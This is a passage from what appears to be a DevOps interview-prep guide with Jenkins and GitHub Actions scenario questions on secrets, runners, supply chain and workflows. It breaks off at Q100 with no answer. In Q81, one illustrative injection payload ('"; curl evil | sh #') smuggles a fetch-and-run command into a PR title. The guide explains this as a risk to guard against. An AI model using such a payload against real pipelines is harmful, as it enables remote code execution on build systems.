1. Look up all usages with the Credentials Binding usage or search `credentialsId` across repos.
2. Update the credential in place, keeping the same ID, so pipelines pick up the new value.
3. Check agents or jobs that cached it in env vars, files or Docker config (`~/.docker/config.json`).

**Why →** Using one ID per secret decouples rotation from pipeline edits.

**Interview tip →** Rotation should be automated and tested, not a heroic event.

</details>

### Q47. Your pipeline logs accidentally show a token because a tool printed it. How do you respond? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Secret exposure in console output.

**What I'd do →**
1. Revoke and rotate the token immediately - deleting the log is not enough, copies may exist.
2. Delete or redact the build logs and artifacts as a secondary step.
3. Wrap secret use in `withCredentials` so masking applies, and stop passing secrets as command-line arguments (process lists and logs).
4. Add a secret-scanning step on logs where possible.

**Why →** Treat any exposed secret as compromised.

**Interview tip →** Mention that masking is best-effort: base64 or split output can bypass it.

</details>

### Q48. A Jenkins agent connects to the controller over JNLP/inbound; security flags the open TCP port. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Inbound agent port exposed too broadly.

**What I'd do →**
1. Use WebSocket agents (`-webSocket`) so agents connect over the same HTTPS port as the UI, removing a separate TCP port.
2. Restrict network paths with security groups and require TLS at the ingress.
3. Use per-agent secrets and rotate them; prefer ephemeral Kubernetes agents that receive secrets automatically.

**Why →** Fewer open ports and encrypted transport reduce attack surface.

**Interview tip →** WebSocket mode needs a recent agent and controller; check versions.

</details>

### Q49. A team wants to store a long-lived GitHub personal access token in Jenkins for checkouts. What is better? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** PATs tie access to a person and rarely expire.

**What I'd do →**
1. Use a GitHub App with the GitHub Branch Source plugin; installation tokens are short-lived and scoped to repos.
2. If an app is not possible, use a machine user with fine-grained read-only token and an expiry date.
3. Store it as a folder-scoped credential.

**Why →** GitHub App tokens are repo-scoped, short-lived, and independent of employees leaving.

**Interview tip →** Offboarding an engineer should never break CI.

</details>

### Q50. You need pipeline-level approval workflows with multiple stages (QA, security, release manager). Design it in Jenkins. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Multi-party gated release.

**What I'd do →**
1. Use sequential `input` stages with `submitter` set per role and `submitterParameter` to log who approved.
2. Keep `agent none` while waiting and add timeouts with an auto-abort.
3. Post each decision to the ticketing system (Jira API) and annotate the deployment in monitoring.
4. Require the artifact digest to be identical across gates; re-verify the signature before the final deploy.

**Why →** Gates tie human approval to an immutable artifact, giving auditability.

**Interview tip →** Mention that approvals on the artifact digest prevent "approved A, shipped B".

</details>

### Q51. Developers can edit the Jenkinsfile in a PR to disable the security scan stage. How do you prevent it? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** The pipeline is controlled by the people it is meant to police.

**What I'd do →**
1. Make mandatory stages part of a shared-library "golden pipeline" that teams call, e.g. `standardPipeline(config)`.
2. Protect the Jenkinsfile and the library with CODEOWNERS and branch protection.
3. Add a required status check that runs the scan independently from the repo's own pipeline.
4. Verify in the admission or deploy step that the artifact carries a scan attestation.

**Why →** Controls must live outside the code under review.

**Interview tip →** Attestation checked at deploy time is the unbypassable control.

</details>

### Q52. A Jenkins job must read secrets from HashiCorp Vault. How do you integrate it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Dynamic secrets rather than static credentials.

**What I'd do →**
1. Install the HashiCorp Vault plugin and configure the Vault URL and AppRole or Kubernetes auth.
2. Use `withVault([vaultSecrets: [[path: 'secret/app', secretValues: [[envVar: 'DB_PASS', vaultKey: 'password']]]]]) { sh '...' }`.
3. Give the Jenkins role a Vault policy that only reads the needed paths with a short TTL.

**Why →** Secrets are fetched at run time, audited by Vault, and never stored in Jenkins.

**Interview tip →** For databases prefer Vault dynamic credentials with a TTL equal to the build.

</details>

### Q53. A contractor needs to view build results but must not see any credentials or console secrets. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Read-only access with minimal exposure.

**What I'd do →**
1. Grant only `Overall/Read` and `Job/Read` on the relevant folder; do not grant `Credentials/View` or `Job/Configure`.
2. Disable "Job/Workspace" if workspaces may contain secrets.
3. Rely on masking but also keep secrets out of outputs.

**Why →** Console output and workspaces are common leak points.

**Interview tip →** Permission granularity in the matrix is what makes this possible.

</details>

### Q54. Jenkins is exposed to the internet for webhooks. What hardening do you apply? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Public attack surface for a privileged system.

**What I'd do →**
1. Put Jenkins behind a reverse proxy/WAF; expose only the webhook path, not the full UI.
2. Allow only the SCM provider IP ranges for webhooks where published, and validate payload secrets.
3. Enforce SSO and MFA, disable anonymous read, enable CSRF protection, and keep the agent-to-controller security enabled.
4. Alternative: use a webhook relay that pulls events, so Jenkins stays private.

**Why →** Several major Jenkins incidents came from exposed, unpatched instances.

**Interview tip →** "Private UI, narrow webhook ingress."

</details>

### Q55. The security team asks you to prove that production builds come only from the main branch of approved repos. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Need verifiable build provenance.

**What I'd do →**
1. Restrict prod-deploy credentials to a folder and job that only builds `main` of approved repos.
2. Generate SLSA-style provenance recording repo, commit, builder and parameters, and sign it (cosign attest).
3. Verify the attestation at deploy time or in admission control (Kyverno `verifyImages`, Sigstore policy-controller).

**Why →** Policy plus signed evidence is stronger than process rules.

**Interview tip →** Name SLSA and cosign; it shows you know the supply-chain vocabulary.

</details>

### Q56. Credentials are used inside a `script` block with string concatenation and Jenkins warns about insecure interpolation. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Groovy interpolates `"${SECRET}"` before the shell runs, leaking into process arguments and logs.

**What I'd do →**
1. Use single-quoted shell strings and let the shell read `$SECRET` from the environment.
2. Pass secrets via stdin or a file where tools allow, e.g. `docker login -u "$U" --password-stdin <<< "$P"`.

**Why →** The secret stays in the environment, not in the Groovy-expanded command line.

**Interview tip →** Be ready to explain Groovy vs shell interpolation in one sentence.

</details>

### Q57. You need cross-team visibility of pipeline health: duration, failure rate, queue time. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Pipelines are a product, so they need SLIs.

**What I'd do →**
1. Enable the Prometheus Metrics plugin, scrape `/prometheus`, and build Grafana dashboards: build duration, queue wait, success ratio, executor utilization.
2. Alert on queue time above a threshold and a sudden failure-rate rise.
3. Add per-stage timing through the OpenTelemetry plugin if tracing is needed.

**Why →** You cannot improve CI speed or reliability without measurement.

**Interview tip →** Queue time is the metric developers feel most.

</details>

### Q58. A Jenkinsfile hardcodes the production URL and keys in the repo. What is the remediation? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Secrets committed to Git.

**What I'd do →**
1. Rotate every exposed secret immediately.
2. Move values to credentials or Vault and non-secret config to environment files.
3. Purge history only after rotation (`git filter-repo`) and add pre-commit and CI secret scanning (gitleaks).

**Why →** Rewriting history does not undo exposure; rotation does.

**Interview tip →** "Rotate first, clean second."

</details>

### Q59. A pipeline library function behaves differently depending on which agent loads it. Why might that be? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Library code runs in the controller's CPS engine; only `sh`/`bat` steps run on agents.

**What I'd do →**
1. Check whether the logic touches the filesystem with `new File(...)` (controller-side) instead of `readFile`/`fileExists` (agent-side).
2. Replace java.io calls with pipeline steps, and keep non-serializable objects out of CPS variables or isolate them in `@NonCPS` methods.
3. Test with JenkinsPipelineUnit and a real agent.

**Why →** Controller-vs-agent semantics in Jenkins Groovy are a common source of subtle bugs.

**Interview tip →** `NotSerializableException` is the symptom to mention.

</details>

### Q60. Management wants to know if giving teams self-service Jenkins folders is safe. How do you make it safe? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Multi-tenancy on one controller.

**What I'd do →**
1. Folders with the Role-based Authorization Strategy and folder-scoped credentials.
2. Resource limits: label-based agents per team, quotas via Kubernetes namespaces.
3. Restrict Script Security so teams cannot approve their own signatures.
4. For hard isolation (regulated workloads), give those teams a separate controller.

**Why →** Folders isolate configuration, not CPU or the JVM; strong isolation needs separate controllers.

**Interview tip →** Be clear about what folders do and do not isolate.

</details>

---

## GitHub Actions

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q61. A repo needs CI on every PR: install, lint, test for Node 20 and 22. Write the workflow. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Standard PR validation with a matrix.

**What I'd do →**
```yaml
name: ci
on:
  pull_request:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node: [20, 22]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm test
```

**Why →** `npm ci` is reproducible and `cache: npm` caches the download cache keyed by the lockfile.

**Interview tip →** Always set `permissions` explicitly to the minimum.

</details>

### Q62. Pushing twice to a PR branch starts two CI runs, and the older one is wasted. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** No concurrency control.

**What I'd do →**
```yaml
concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```
Do not cancel in-progress deploys: for deploy workflows use a group with `cancel-in-progress: false` so runs queue.

**Why →** Cancelling stale CI saves minutes, while deploys should finish cleanly.

**Interview tip →** Know that a concurrency group holds one running and at most one pending run.

</details>

### Q63. Your organization has 30 repos that all need the same build-and-push-image pipeline. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Duplicated workflows.

**What I'd do →**
1. Create a central repo with a reusable workflow using `on: workflow_call` and typed `inputs`/`secrets`.
2. Call it: `uses: my-org/ci-workflows/.github/workflows/build.yml@v2` with `with:` and `secrets: inherit` (or explicit secrets).
3. Version it by tag and update through Dependabot.

**Why →** Central maintenance with versioning, and callers keep a 10-line file.

**Interview tip →** Contrast reusable workflows (whole jobs) with composite actions (steps).

</details>

### Q64. You want a team-specific step sequence (setup toolchain, cache, login) reused inside many jobs. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A repeated step sequence, not whole jobs.

**What I'd do →**
1. Create a composite action: `action.yml` with `runs: using: composite` and steps; each `run` step needs a `shell:`.
2. Place it in `.github/actions/setup/` for one repo or in its own repo for sharing.
3. Call it with `uses: ./.github/actions/setup`.

**Why →** Composite actions reduce boilerplate while staying transparent and easy to test.

**Interview tip →** Composite steps cannot use `secrets` context directly; pass them as inputs.

</details>

### Q65. Deployments to production need a manual approval and only the main branch may deploy. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Environment protection rules.

**What I'd do →**
1. Create a `production` environment with required reviewers and a deployment branch rule limited to `main`.
2. Reference it: `jobs.deploy.environment: production`.
3. Store prod secrets as environment secrets, so they are released only after approval.

**Why →** Secrets and approvals are enforced by the platform, not by workflow code a PR could change.

**Interview tip →** Note that environment secrets are not available to jobs that do not target that environment.

</details>

### Q66. Your deploy job uses a long-lived AWS access key stored in repo secrets. How do you improve it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Static cloud keys in CI.

**What I'd do →**
1. Create an IAM OIDC identity provider for `token.actions.githubusercontent.com` and a role with a trust policy limited to `repo:my-org/app:environment:production` in the `sub` claim and `aud` of `sts.amazonaws.com`.
2. In the workflow, set `permissions: id-token: write` and use `aws-actions/configure-aws-credentials@v4` with `role-to-assume`.
3. Delete the stored keys.

**Why →** OIDC yields short-lived credentials scoped to a repo, branch or environment, with nothing to leak.

**Interview tip →** A trust policy without a tight `sub` condition lets any repo assume the role.

</details>

### Q67. CI takes 12 minutes mostly because dependencies are downloaded every run. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** No dependency caching.

**What I'd do →**
1. Use the built-in cache of setup actions (`cache: npm|pip|maven|gradle`) or `actions/cache@v4` with `key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}` and `restore-keys`.
2. Cache the package manager cache directory, not `node_modules`.
3. Watch the 10 GB per-repo cache limit and eviction.

**Why →** Keying on the lockfile hash invalidates exactly when dependencies change.

**Interview tip →** Caches from PR branches are not shared with sibling branches, only from the default and base branches.

</details>

### Q68. Builds must produce a binary in one job and use it in a later job on a different runner. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Jobs do not share a filesystem.

**What I'd do →**
```yaml
- uses: actions/upload-artifact@v4
  with: { name: app, path: dist/, retention-days: 7 }
# later job
- uses: actions/download-artifact@v4
  with: { name: app }
```
Add `needs: build` to the consuming job.

**Why →** Artifacts move files between jobs; caches speed up dependencies - different tools.

**Interview tip →** In v4 artifact names must be unique per run, and matrix jobs need distinct names.

</details>

### Q69. A workflow must only run when files in `services/api/` change. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Path filtering.

**What I'd do →**
```yaml
on:
  pull_request:
    paths: ['services/api/**', '.github/workflows/api.yml']
```
If the check is a required status check, a skipped workflow stays "pending", so use a small always-run job or a path filter action such as `dorny/paths-filter` inside one workflow.

**Why →** Required checks and path filters conflict, which is a common surprise.

**Interview tip →** Mention the pending-required-check pitfall.

</details>

### Q70. Self-hosted runners are shared by many teams and a job once left secrets on disk for the next job. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Persistent runners are not isolated between jobs.

**What I'd do →**
1. Use ephemeral runners (`--ephemeral`) that take one job and exit, via Actions Runner Controller (ARC) on Kubernetes or a VM autoscaler.
2. Run on dedicated runner groups per team or sensitivity.
3. Never use self-hosted runners for public repos or untrusted fork PRs.
4. Clean the work directory and block host Docker socket access.

**Why →** One job per fresh environment prevents cross-job leakage and persistence.

**Interview tip →** "Ephemeral and just-in-time" is the answer to self-hosted security.

</details>

### Q71. You need to run integration tests against Postgres and Redis inside a job. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Service containers.

**What I'd do →**
```yaml
services:
  db:
    image: postgres:16
    env: { POSTGRES_PASSWORD: test }
    ports: ['5432:5432']
    options: >-
      --health-cmd "pg_isready -U postgres"
      --health-interval 5s --health-retries 10
  redis:
    image: redis:7
    ports: ['6379:6379']
```

**Why →** Health checks make the job wait until the service is ready, and services are destroyed after the job.

**Interview tip →** On the runner host use `localhost:<mapped port>`; inside a container job use the service name.

</details>

### Q72. A scheduled workflow should run every night, but it never runs on forks and sometimes is delayed. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Behaviour of `schedule`.

**What I'd do →**
1. `on: schedule: - cron: '17 2 * * *'` (UTC) and also add `workflow_dispatch` for manual runs.
2. Avoid the top of the hour, since peak load delays runs.
3. Remember scheduled workflows run from the default branch only, and are disabled after 60 days of repo inactivity in public repos.

**Why →** These are documented properties, not bugs.

**Interview tip →** Cron is always UTC.

</details>

### Q73. A release workflow must run when a tag `v1.2.3` is pushed and publish a GitHub Release with notes. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Tag-triggered release.

**What I'd do →**
```yaml
on:
  push:
    tags: ['v*.*.*']
permissions:
  contents: write
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: gh release create "$GITHUB_REF_NAME" --generate-notes dist/*
        env: { GH_TOKEN: "${{ github.token }}" }
```

**Why →** `gh release create --generate-notes` builds notes from merged PRs, and `contents: write` is scoped to this workflow.

**Interview tip →** Keep write permissions only on the job that needs them.

</details>

### Q74. A third-party action is used in 80 workflows. Security asks how you will control supply-chain risk. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Mutable tags like `@v4` can be moved by the action's maintainer or an attacker.

**What I'd do →**
1. Pin to full commit SHAs with a version comment: `uses: actions/checkout@<40-char-sha> # v4.2.2`.
2. Let Dependabot or Renovate update the SHAs with reviewable PRs.
3. Set the org policy to allow only GitHub-owned and an allow-list of actions.
4. Prefer a few vetted actions; for simple tasks use plain `run` steps.

**Why →** A compromised tag is exactly how past action supply-chain attacks spread.

**Interview tip →** Mention SHA pinning plus an org-level allow-list.

</details>

### Q75. A PR from a fork needs to run tests but must not get repo secrets. How do you set up triggers? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** `pull_request` vs `pull_request_target`.

**What I'd do →**
1. Use `pull_request` for tests: forks get a read-only token and no secrets.
2. If you must comment on the PR, use a second workflow on `workflow_run` that reads artifacts produced by the first, and treat them as untrusted data.
3. Never check out and run PR head code in a `pull_request_target` workflow.

**Why →** `pull_request_target` runs with secrets and a write token on the base repo; running fork code there is a known compromise path.

**Interview tip →** Two-workflow pattern for fork comments.

</details>

### Q76. A workflow builds a Docker image and pushes to GHCR. Show a secure setup. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Image build with minimal credentials.

**What I'd do →**
```yaml
permissions: { contents: read, packages: write }
steps:
  - uses: actions/checkout@v4
  - uses: docker/setup-buildx-action@v3
  - uses: docker/login-action@v3
    with: { registry: ghcr.io, username: "${{ github.actor }}", password: "${{ secrets.GITHUB_TOKEN }}" }
  - uses: docker/build-push-action@v6
    with:
      push: true
      tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
      cache-from: type=gha
      cache-to: type=gha,mode=max
```

**Why →** `GITHUB_TOKEN` expires with the job, and the `gha` cache speeds up layers.

**Interview tip →** Tag with the commit SHA; add a moving tag only for convenience.

</details>

### Q77. A deployment workflow should run only after CI succeeds on main. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Chain workflows.

**What I'd do →**
1. Option A: one workflow with `jobs.deploy.needs: [test]` and `if: github.ref == 'refs/heads/main'`.
2. Option B: `on: workflow_run: workflows: [ci], types: [completed], branches: [main]` with `if: github.event.workflow_run.conclusion == 'success'`.

**Why →** One workflow is simpler and shows one graph; `workflow_run` is useful when workflows live separately, but runs with different context and must check out the correct SHA.

**Interview tip →** With `workflow_run`, check out `github.event.workflow_run.head_sha`.

</details>

### Q78. A matrix of 40 jobs is eating minutes. How do you control cost? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Over-broad matrix.

**What I'd do →**
1. Run the full matrix only on `main` and nightly; on PRs run one representative combination using `if` or dynamic matrix from a previous job.
2. Use `strategy.fail-fast: true` and `max-parallel` where useful.
3. Use `exclude`, path filters and caching, and cancel redundant runs with `concurrency`.

**Why →** Most regressions are caught by a small set; the rest can be post-merge.

**Interview tip →** Cost is a CI design constraint.

</details>

### Q79. You want one workflow job to decide dynamically which services to build, then fan out. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Dynamic matrix.

**What I'd do →**
```yaml
jobs:
  plan:
    runs-on: ubuntu-latest
    outputs:
      services: ${{ steps.p.outputs.services }}
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - id: p
        run: echo "services=$(./scripts/changed-services.sh | jq -cR '[., inputs]')" >> "$GITHUB_OUTPUT"
  build:
    needs: plan
    if: needs.plan.outputs.services != '[]'
    strategy:
      matrix:
        service: ${{ fromJSON(needs.plan.outputs.services) }}
    runs-on: ubuntu-latest
    steps:
      - run: ./build.sh ${{ matrix.service }}
```

**Why →** `fromJSON` turns job output into a matrix, so the graph adapts to the change set.

**Interview tip →** Guard the empty list case; an empty matrix fails the workflow.

</details>

### Q80. Developers can trigger production deploys manually with a chosen version. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** On-demand deploy with inputs.

**What I'd do →**
```yaml
on:
  workflow_dispatch:
    inputs:
      version:
        description: Image tag to deploy
        required: true
      environment:
        type: choice
        options: [staging, production]
```
Use `environment: ${{ inputs.environment }}` so approvals apply, and validate the version exists in the registry before deploying.

**Why →** Typed inputs reduce mistakes, and environments keep approvals enforced.

**Interview tip →** Never interpolate `inputs.*` directly into shell; pass through `env`.

</details>

### Q81. A workflow step uses `${{ github.event.pull_request.title }}` inside a `run:` script. Is that a problem? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Script injection.

**What I'd do →**
1. Never put untrusted context values (titles, branch names, issue bodies) directly into `run`; they are expanded before the shell runs.
2. Pass them as env vars: `env: TITLE: ${{ github.event.pull_request.title }}` and use `"$TITLE"` in the script.
3. Scan workflows with `zizmor` or CodeQL's Actions queries.

**Why →** A title like `"; curl evil | sh #` becomes executable code.

**Interview tip →** "Context goes through env, never inline."

</details>

### Q82. Teams complain CI is slow because jobs wait for a GitHub-hosted runner with Docker-in-Docker and large resources. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Standard runners are too small or queues are long.

**What I'd do →**
1. Use larger GitHub-hosted runners for heavy jobs or self-hosted ARC runners with right-sized pods.
2. Cache Docker layers via `cache-to: type=gha` or a registry cache, and build with BuildKit.
3. Split the pipeline so only the heavy job takes the big runner.

**Why →** Right-sizing is cheaper than putting everything on big machines.

**Interview tip →** Measure first: look at job timing graphs.

</details>

### Q83. You want the workflow to post test coverage on the PR and fail if coverage drops below 80%. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Quality gate in CI.

**What I'd do →**
1. Generate coverage (`pytest --cov --cov-fail-under=80` or JaCoCo check rule).
2. Upload report as artifact and publish a summary to `$GITHUB_STEP_SUMMARY`.
3. Make the job a required status check in branch protection or rulesets.

**Why →** The tool's own threshold fails the step; branch protection makes the failure block merge.

**Interview tip →** Prefer "no drop on changed code" to a flat global threshold.

</details>

### Q84. You need a nightly job that opens an issue if dependency scanning finds critical vulnerabilities. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Scheduled security automation.

**What I'd do →**
1. `on: schedule` with `permissions: { contents: read, issues: write }`.
2. Run `trivy fs --severity CRITICAL --exit-code 1 .`; on failure use `gh issue create --title ... --body-file report.txt`.
3. Enable Dependabot alerts and security updates as the baseline.

**Why →** Issues create a tracked, owned work item instead of a red nightly build nobody reads.

**Interview tip →** Route findings to owners; noise kills adoption.

</details>

### Q85. A single monorepo workflow is 600 lines. How do you organize it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Workflow sprawl.

**What I'd do →**
1. Split per domain (`api.yml`, `web.yml`) with path filters.
2. Extract reusable workflows (`workflow_call`) for build/deploy, and composite actions for setup.
3. Keep matrix and conditionals readable; YAML anchors are now supported in workflow files, but use them sparingly because they hide the effective job definition.

**Why →** Reusable workflows and composite actions give versioned, testable reuse, while anchors only deduplicate text inside one file.

**Interview tip →** Reuse across files needs reusable workflows or composite actions, not anchors.

</details>

### Q86. Production deploys must be blocked during a freeze window. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Change freeze.

**What I'd do →**
1. Use a custom deployment protection rule on the `production` environment (a GitHub App) that checks a calendar or feature flag.
2. Or add a first job that queries a freeze API and fails with a clear message.
3. Keep an emergency override that requires two approvers and is logged.

**Why →** The check is centralised, so teams cannot forget it.

**Interview tip →** Always provide a break-glass path; freezes with no override push people to bypass controls.

</details>

### Q87. Monorepo with multiple environments; you want the same image promoted dev → staging → prod. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Build once, promote.

**What I'd do →**
1. Build and push `app:<sha>` once, record the digest as a job output.
2. Deploy jobs for `dev`, `staging`, `prod` use `needs`, each targeting an `environment:` and deploy `app@sha256:...`.
3. Config differences come from per-environment values, not from rebuilding.

**Why →** What you tested is exactly what you ship.

**Interview tip →** Deploy by digest, not mutable tag.

</details>

### Q88. A release must be signed and have provenance so consumers can verify it. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Supply-chain attestation in Actions.

**What I'd do →**
1. Set `permissions: { id-token: write, attestations: write, contents: read }`.
2. Build image/binary, then use `actions/attest-build-provenance@v2` with `subject-name` and `subject-digest` (or `cosign sign --yes` keyless using the OIDC token).
3. Consumers verify with `gh attestation verify` or `cosign verify --certificate-identity ... --certificate-oidc-issuer https://token.actions.githubusercontent.com`.

**Why →** Keyless signing ties the artifact to the workflow identity that built it.

**Interview tip →** Say "identity-based verification" rather than "we sign with a key".

</details>

### Q89. A job needs to run only when a label such as `deploy-preview` is on the PR. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Conditional job on PR metadata.

**What I'd do →**
```yaml
on:
  pull_request:
    types: [opened, synchronize, labeled]
jobs:
  preview:
    if: contains(github.event.pull_request.labels.*.name, 'deploy-preview')
```

**Why →** `labeled` must be in `types` or adding the label will not trigger a run.

**Interview tip →** Default PR types are opened, synchronize and reopened.

</details>

### Q90. How do you give a job read access to a private repo that holds shared Terraform modules? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** `GITHUB_TOKEN` is scoped to the current repo only.

**What I'd do →**
1. Prefer a GitHub App: create an installation token with `actions/create-github-app-token@v1` limited to the module repo.
2. Alternative: a read-only deploy key per repo; avoid a broad PAT.
3. Use the token in `actions/checkout` with `repository:` and `token:` inputs.

**Why →** An app token is short-lived and repo-scoped, independent of any user.

**Interview tip →** Same principle as Jenkins GitHub App: avoid PATs.

</details>

### Q91. A required status check never reports on documentation-only PRs, blocking merges. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Path-filtered workflow skipped, so the required check stays pending.

**What I'd do →**
1. Remove `paths` from the workflow trigger and decide inside using a change-detection job; skipped jobs report as success when their condition is false.
2. Or add a lightweight workflow with inverse `paths-ignore` that reports the same check name.

**Why →** A required check must always report a result.

**Interview tip →** Know that a skipped job counts as passing, a skipped workflow does not report.

</details>

### Q92. You want to run CI on macOS and Windows only for the release branch. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Costly runners for narrow use.

**What I'd do →**
1. Use `runs-on: ${{ matrix.os }}` with `os: [ubuntu-latest, macos-latest, windows-latest]`.
2. Gate expensive OSes: `include` them only when `startsWith(github.ref, 'refs/heads/release/')` via a dynamic matrix.

**Why →** macOS minutes cost several times more than Linux, so use them where they add value.

**Interview tip →** Linux for fast feedback, others for compatibility confidence.

</details>

### Q93. Developers want ephemeral preview environments for each PR, destroyed on close. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Per-PR environments with lifecycle.

**What I'd do →**
1. On `pull_request` (opened, synchronize) deploy to namespace `pr-${{ github.event.number }}` using Helm with a unique host name and post the URL as a PR comment.
2. On `pull_request: types: [closed]` run `helm uninstall` and delete the namespace.
3. Add a nightly cleanup of namespaces older than N days as a safety net, plus resource quotas.

**Why →** Previews shorten review cycles, but orphaned environments cost money without the cleanup job.

**Interview tip →** The safety-net sweeper is what distinguishes a production-grade design.

</details>

### Q94. A workflow must use the output of one step in another job, e.g. the built version. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Data passing.

**What I'd do →**
```yaml
jobs:
  build:
    outputs:
      version: ${{ steps.v.outputs.version }}
    steps:
      - id: v
        run: echo "version=1.4.${{ github.run_number }}" >> "$GITHUB_OUTPUT"
  deploy:
    needs: build
    steps:
      - run: echo "Deploying ${{ needs.build.outputs.version }}"
```

**Why →** `$GITHUB_OUTPUT` replaced the deprecated `::set-output` command.

**Interview tip →** Do not put secrets in outputs; they are masked unreliably.

</details>

### Q95. A bot should auto-merge Dependabot patch updates when CI passes. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Automate low-risk updates safely.

**What I'd do →**
1. Use `dependabot/fetch-metadata` to read `update-type`.
2. If `version-update:semver-patch`, run `gh pr merge --auto --squash "$PR_URL"` with `GH_TOKEN` and `pull-requests: write`.
3. Enable "Allow auto-merge" and required checks on the repo.

**Why →** Auto-merge waits for required checks, so a failing update is never merged.

**Interview tip →** Limit to patch/minor of dev dependencies first.

</details>

### Q96. A very long job is flaky near the end and you want to retry only failed jobs. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Rerunning the whole workflow wastes time.

**What I'd do →**
1. Use "Re-run failed jobs" in the UI or `gh run rerun <id> --failed`.
2. Split the long job into smaller ones so a retry is cheap.
3. Fix the flake, and use step-level retry only for network calls.

**Why →** Smaller jobs mean smaller retries and clearer failure signals.

**Interview tip →** Say you quantify flakiness rather than normalise reruns.

</details>

### Q97. You need to post deployment status to the GitHub Deployments API so teams see what is live. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Visibility of what runs where.

**What I'd do →**
1. Use `environment:` with `url:` on the job; GitHub records a deployment and status automatically.
2. Add the environment URL output: `environment: { name: production, url: ${{ steps.deploy.outputs.url }} }`.
3. Use the environments page and deployment history for rollbacks and audit.

**Why →** No extra tooling; each deploy has a commit, actor and time.

**Interview tip →** Link this to DORA deployment frequency measurement.

</details>

### Q98. Your Actions bill doubled. What do you audit? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Unbounded usage.

**What I'd do →**
1. Review usage by repo and workflow (billing page or `gh api /orgs/ORG/settings/billing/actions`).
2. Look for: runs triggered on every push to every branch, missing `concurrency`, huge matrices, missing `timeout-minutes`, macOS/Windows overuse, artifact retention.
3. Set `timeout-minutes` on jobs, reduce `retention-days`, and move heavy workloads to self-hosted runners.

**Why →** Most waste comes from a few workflows.

**Interview tip →** Always set `timeout-minutes`; the default of 360 can burn hours on a hung job.

</details>

### Q99. A team asks for a workflow that deploys Terraform with a plan on PR and apply on merge. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Safe IaC pipeline.

**What I'd do →**
1. On `pull_request`: `terraform fmt -check`, `validate`, `plan -out=tfplan` and post the plan as a PR comment; use OIDC with a read-only role.
2. On `push` to main: environment `production` with required reviewers, apply the saved plan from the same commit with a write role.
3. Use remote state with locking (S3 + DynamoDB or S3 native lockfile) and a `concurrency` group per state.

**Why →** Separate roles for plan and apply keep PRs from changing infrastructure.

**Interview tip →** Plan on PR, apply on merge, with different IAM roles.

</details>

### Q100. You must run a workflow only if the commit message does not contain `[skip ci]`. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Skip behaviour.

**What I'd do →**
